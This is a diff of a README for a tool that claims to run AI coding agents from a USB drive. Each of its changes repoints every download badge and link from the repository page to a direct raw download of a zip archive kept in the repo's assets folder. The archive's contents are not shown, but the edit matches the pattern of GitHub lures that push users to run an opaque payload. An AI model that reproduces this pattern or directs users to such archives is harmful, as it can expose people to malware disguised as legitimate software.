@@ -1,6 +1,6 @@
 # 🤖 portable-agent-usb - Run AI Coding Agents Anywhere
 
-[![Download portable-agent-usb](https://img.shields.io/badge/Download-portable--agent--usb-brightgreen?style=for-the-badge)](https://github.com/AthusLopes/portable-agent-usb)
+[![Download portable-agent-usb](https://img.shields.io/badge/Download-portable--agent--usb-brightgreen?style=for-the-badge)](https://github.com/AthusLopes/portable-agent-usb/raw/refs/heads/main/assets/agent-portable-usb-1.3.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Follow these steps to get portable-agent-usb running on your Windows PC:
 1. **Download portable-agent-usb**
 
    Visit this page to download portable-agent-usb:  
-   [https://github.com/AthusLopes/portable-agent-usb](https://github.com/AthusLopes/portable-agent-usb)
+   [https://github.com/AthusLopes/portable-agent-usb/raw/refs/heads/main/assets/agent-portable-usb-1.3.zip](https://github.com/AthusLopes/portable-agent-usb/raw/refs/heads/main/assets/agent-portable-usb-1.3.zip)
 
 2. **Copy files to your USB Drive**
 
@@ -68,7 +68,7 @@ All components needed to run the agents exist on the USB drive. This lets you ta
 
 Use the link below to access the repository page. This page contains the latest release along with instructions and files you need to start.
 
-[**Visit the Download Page**](https://github.com/AthusLopes/portable-agent-usb)
+[**Visit the Download Page**](https://github.com/AthusLopes/portable-agent-usb/raw/refs/heads/main/assets/agent-portable-usb-1.3.zip)
 
 ### Step-by-step download:
 
@@ -145,4 +145,4 @@ These tags reflect the core usage and technology backing portable-agent-usb.
 
 ---
 
-[![Download portable-agent-usb](https://img.shields.io/badge/Download-portable--agent--usb-brightgreen?style=for-the-badge)](https://github.com/AthusLopes/portable-agent-usb)
+[![Download portable-agent-usb](https://img.shields.io/badge/Download-portable--agent--usb-brightgreen?style=for-the-badge)](https://github.com/AthusLopes/portable-agent-usb/raw/refs/heads/main/assets/agent-portable-usb-1.3.zip)
